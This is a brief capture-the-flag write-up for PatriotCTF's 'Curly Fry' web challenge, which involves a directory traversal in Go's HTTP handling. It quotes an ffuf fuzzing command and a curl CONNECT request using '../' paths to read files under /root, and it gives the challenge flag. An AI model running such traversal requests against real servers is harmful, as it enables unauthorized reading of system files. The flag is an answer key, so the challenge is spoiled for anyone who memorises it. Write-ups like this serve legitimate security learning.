# Curly Fry


## The Problem

Points: 500

Rating:

Author:

Flavor Text:
```

chal2.pctf.competitivecyber.club:49535



```

Attachments : [Curly%20Fry.html](Curly%20Fry.html)

## Solution

I was unable to complete this chal but did manage to work out that it was a directory traversal issue with the golang http lib but I wasnt able to work out the directory structure. 

https://github.com/NihilistPenguin/PatriotCTF2022-Writeups/blob/main/Web/CurlyFry.md

NihilistPenguin posted a good method of fuzing the directory 

```
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -u http://localhost/../../../../../../../root/FUZZ -e .txt -X CONNECT -c -fs 50

```

that leads to a connect request like: 

curl --path-as-is -X CONNECT http://localhost/../../../../../../../root/recipe.txt


## Flag
```
PCTF{tru5t_m3_im_4_ch3f}
```

## Final Notes
